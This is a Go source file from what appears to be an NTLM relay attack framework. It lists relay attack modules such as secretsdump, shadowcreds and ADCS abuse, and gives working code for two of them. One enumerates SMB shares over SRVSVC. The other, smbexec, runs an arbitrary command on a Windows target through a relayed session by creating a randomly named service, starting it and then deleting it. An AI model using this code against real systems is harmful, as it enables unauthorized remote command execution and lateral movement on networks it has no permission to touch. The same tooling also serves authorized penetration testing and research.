// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"unicode/utf16"

	"gopacket/pkg/dcerpc"
	"gopacket/pkg/dcerpc/svcctl"
)

// getAttackModule returns the attack module for the given name.
func getAttackModule(name string) AttackModule {
	switch name {
	// SMB attacks
	case "shares":
		return &SharesAttack{}
	case "smbexec":
		return &SMBExecAttack{}
	case "samdump":
		return &SAMDumpAttack{}
	case "secretsdump":
		return &SecretsdumpAttack{}
	case "tschexec":
		return &TschExecAttack{}
	case "enumlocaladmins":
		return &EnumLocalAdminsAttack{}
	// LDAP attacks
	case "ldapdump":
		return &LDAPDumpAttack{}
	case "delegate":
		return &DelegateAttack{}
	case "aclabuse":
		return &ACLAbuseAttack{}
	case "addcomputer":
		return &AddComputerAttack{}
	case "shadowcreds":
		return &ShadowCredsAttack{}
	case "laps":
		return &LAPSDumpAttack{}
	case "gmsa":
		return &GMSADumpAttack{}
	case "adddns":
		return &DNSRecordAttack{}
	// MSSQL attacks
	case "mssqlquery":
		return &MSSQLQueryAttack{}
	// HTTP attacks
	case "adcs":
		return &ADCSAttack{}
	// WinRM attacks
	case "winrmexec":
		return &WinRMExecAttack{}
	// RPC attacks
	case "rpctschexec":
		return &RPCTschExecAttack{}
	case "icpr":
		return &RPCICPRAttack{}
	default:
		return nil
	}
}

// SharesAttack enumerates shares on the target via SRVSVC.
type SharesAttack struct{}

func (a *SharesAttack) Name() string { return "shares" }

func (a *SharesAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("shares attack requires SMB session")
	}
	return sharesAttack(client, config)
}

// SMBExecAttack executes a command on the target via service creation.
type SMBExecAttack struct{}

func (a *SMBExecAttack) Name() string { return "smbexec" }

func (a *SMBExecAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("smbexec attack requires SMB session")
	}
	return smbExecAttack(client, config)
}

// SRVSVC UUID and constants
var srvsvcUUID = [16]byte{
	0xc8, 0x4f, 0x32, 0x4b, 0x70, 0x16, 0xd3, 0x01,
	0x12, 0x78, 0x5a, 0x47, 0xbf, 0x6e, 0xe1, 0x88,
}

const (
	srvsvcMajorVersion = 3
	srvsvcMinorVersion = 0
	opNetShareEnumAll  = 15
)

// sharesAttack enumerates shares on the target via SRVSVC
func sharesAttack(client *SMBRelayClient, cfg *Config) error {
	log.Printf("[*] Enumerating shares on %s...", cfg.TargetAddr)

	// Connect to IPC$ and open srvsvc pipe
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("srvsvc")
	if err != nil {
		return fmt.Errorf("open srvsvc pipe: %v", err)
	}
	defer client.ClosePipe(fileID)

	// Create DCERPC client over relay pipe
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	// Bind to SRVSVC
	if err := rpcClient.Bind(srvsvcUUID, srvsvcMajorVersion, srvsvcMinorVersion); err != nil {
		return fmt.Errorf("bind srvsvc: %v", err)
	}

	// Call NetShareEnumAll (OpNum 15)
	shares, err := netShareEnumAll(rpcClient)
	if err != nil {
		return fmt.Errorf("NetShareEnumAll: %v", err)
	}

	log.Printf("[+] Found %d shares:", len(shares))
	for _, s := range shares {
		log.Printf("    %-20s %s", s.Name, s.Comment)
	}

	return nil
}

type shareInfo struct {
	Name    string
	Type    uint32
	Comment string
}

// netShareEnumAll calls NetShareEnumAll via SRVSVC
func netShareEnumAll(client *dcerpc.Client) ([]shareInfo, error) {
	buf := new(bytes.Buffer)

	// ServerName (pointer + conformant string)
	binary.Write(buf, binary.LittleEndian, uint32(0x20000)) // Ptr
	serverName := utf16.Encode([]rune("\\\\*"))
	serverName = append(serverName, 0)
	count := uint32(len(serverName))
	binary.Write(buf, binary.LittleEndian, count)     // MaxCount
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Offset
	binary.Write(buf, binary.LittleEndian, count)     // ActualCount
	for _, c := range serverName {
		binary.Write(buf, binary.LittleEndian, c)
	}
	// Pad to 4 bytes
	if (len(serverName)*2)%4 != 0 {
		buf.Write(make([]byte, 4-(len(serverName)*2)%4))
	}

	// InfoStruct (SHARE_ENUM_STRUCT)
	binary.Write(buf, binary.LittleEndian, uint32(1)) // Level = 1

	// ShareInfo union (level 1)
	binary.Write(buf, binary.LittleEndian, uint32(1))       // Switch value = 1
	binary.Write(buf, binary.LittleEndian, uint32(0x20004)) // Referent ID for SHARE_INFO_1_CONTAINER*

	// SHARE_INFO_1_CONTAINER (deferred pointer target)
	binary.Write(buf, binary.LittleEndian, uint32(0)) // EntriesRead = 0
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Buffer ptr = NULL

	// PreferedMaximumLength
	binary.Write(buf, binary.LittleEndian, uint32(0xFFFFFFFF)) // -1 = max

	// ResumeHandle (pointer)
	binary.Write(buf, binary.LittleEndian, uint32(0x20000)) // Ptr
	binary.Write(buf, binary.LittleEndian, uint32(0))       // Value = 0

	resp, err := client.Call(opNetShareEnumAll, buf.Bytes())
	if err != nil {
		return nil, err
	}

	return parseNetShareEnumResponse(resp)
}

// parseNetShareEnumResponse parses the NDR response from NetShareEnumAll
func parseNetShareEnumResponse(resp []byte) ([]shareInfo, error) {
	if len(resp) < 20 {
		return nil, fmt.Errorf("response too short: %d bytes", len(resp))
	}

	r := bytes.NewReader(resp)

	// Level (4 bytes)
	var level uint32
	binary.Read(r, binary.LittleEndian, &level)

	// Switch value (4 bytes)
	var switchVal uint32
	binary.Read(r, binary.LittleEndian, &switchVal)

	// Referent ID for SHARE_INFO_1_CONTAINER* (pointer in union)
	var containerRef uint32
	binary.Read(r, binary.LittleEndian, &containerRef)

	// SHARE_INFO_1_CONTAINER
	var entriesRead uint32
	binary.Read(r, binary.LittleEndian, &entriesRead)

	// Buffer pointer
	var bufPtr uint32
	binary.Read(r, binary.LittleEndian, &bufPtr)

	if bufPtr == 0 || entriesRead == 0 {
		return nil, nil
	}

	// Array MaxCount
	var maxCount uint32
	binary.Read(r, binary.LittleEndian, &maxCount)

	// Read SHARE_INFO_1 entries (pointer-based: name_ptr(4) + type(4) + comment_ptr(4) each)
	type shareEntry struct {
		NamePtr    uint32
		ShareType  uint32
		CommentPtr uint32
	}

	entries := make([]shareEntry, entriesRead)
	for i := uint32(0); i < entriesRead; i++ {
		binary.Read(r, binary.LittleEndian, &entries[i].NamePtr)
		binary.Read(r, binary.LittleEndian, &entries[i].ShareType)
		binary.Read(r, binary.LittleEndian, &entries[i].CommentPtr)
	}

	// Now read the deferred strings
	shares := make([]shareInfo, 0, entriesRead)
	for i := uint32(0); i < entriesRead; i++ {
		name := ""
		comment := ""

		if entries[i].NamePtr != 0 {
			name = readNDRString(r)
		}
		if entries[i].CommentPtr != 0 {
			comment = readNDRString(r)
		}

		shares = append(shares, shareInfo{
			Name:    name,
			Type:    entries[i].ShareType,
			Comment: comment,
		})
	}

	return shares, nil
}

func readNDRString(r *bytes.Reader) string {
	var maxCount, offset, actualCount uint32
	binary.Read(r, binary.LittleEndian, &maxCount)
	binary.Read(r, binary.LittleEndian, &offset)
	binary.Read(r, binary.LittleEndian, &actualCount)

	chars := make([]uint16, actualCount)
	binary.Read(r, binary.LittleEndian, &chars)

	// Pad to 4-byte boundary
	bytesRead := actualCount * 2
	if bytesRead%4 != 0 {
		pad := 4 - (bytesRead % 4)
		r.Seek(int64(pad), 1)
	}

	// Trim null terminator
	if len(chars) > 0 && chars[len(chars)-1] == 0 {
		chars = chars[:len(chars)-1]
	}

	return string(utf16.Decode(chars))
}

// smbExecAttack executes a command on the target via service creation
func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
	if cfg.Command == "" {
		return fmt.Errorf("no command specified (-c flag)")
	}

	log.Printf("[*] Executing command on %s via service creation...", cfg.TargetAddr)

	// Connect to IPC$ and open svcctl pipe
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("svcctl")
	if err != nil {
		return fmt.Errorf("open svcctl pipe: %v", err)
	}
	defer client.ClosePipe(fileID)

	// Create DCERPC client over relay pipe
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	// Bind to SVCCTL
	if err := rpcClient.Bind(svcctl.UUID, svcctl.MajorVersion, svcctl.MinorVersion); err != nil {
		return fmt.Errorf("bind svcctl: %v", err)
	}

	// Create service controller
	sc, err := svcctl.NewServiceController(rpcClient)
	if err != nil {
		return fmt.Errorf("open SCManager: %v", err)
	}
	defer sc.Close()

	// Generate random service name
	serviceName := fmt.Sprintf("gopacket%04x", rand.Intn(0xFFFF))

	// Build command - use cmd.exe /C to execute
	binaryPath := fmt.Sprintf("%%COMSPEC%% /C %s", cfg.Command)

	log.Printf("[*] Creating service %s...", serviceName)

	// Create service
	svcHandle, err := sc.CreateService(
		serviceName,
		serviceName,
		binaryPath,
		svcctl.SERVICE_WIN32_OWN_PROCESS,
		svcctl.SERVICE_DEMAND_START,
		svcctl.ERROR_IGNORE,
	)
	if err != nil {
		return fmt.Errorf("create service: %v", err)
	}

	log.Printf("[*] Starting service %s...", serviceName)

	// Start service (will fail since it's cmd.exe, but the command executes)
	err = sc.StartService(svcHandle)
	if err != nil {
		// Expected: the command runs then the service stops, but that's fine
		log.Printf("[*] Service start returned: %v (this is often expected)", err)
	}

	log.Printf("[*] Deleting service %s...", serviceName)

	// Close the create handle and re-open by name for delete
	// (relay sessions may lose access on the original handle after start)
	sc.CloseServiceHandle(svcHandle)

	deleteHandle, err := sc.OpenService(serviceName, svcctl.SERVICE_ALL_ACCESS)
	if err != nil {
		log.Printf("[-] Warning: failed to re-open service for delete: %v", err)
	} else {
		if err := sc.DeleteService(deleteHandle); err != nil {
			log.Printf("[-] Warning: failed to delete service: %v", err)
		}
		sc.CloseServiceHandle(deleteHandle)
	}

	log.Printf("[+] Command executed: %s", cfg.Command)

	return nil
}
